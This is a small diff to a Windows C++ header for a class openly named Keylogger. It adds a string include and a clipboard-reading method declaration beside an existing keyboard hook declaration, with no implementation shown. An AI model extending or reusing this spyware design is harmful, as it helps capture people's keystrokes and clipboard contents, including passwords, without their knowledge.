@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <fstream>
+#include <string>
 
 class Keylogger {
 private:
@@ -15,4 +16,6 @@ public:
 
     static wchar_t* vk2ascii(UINT vkCode);
     static LRESULT CALLBACK KBHook(int code, WPARAM wParam, LPARAM lParam);
+
+    std::wstring GetClipboardText();
 };
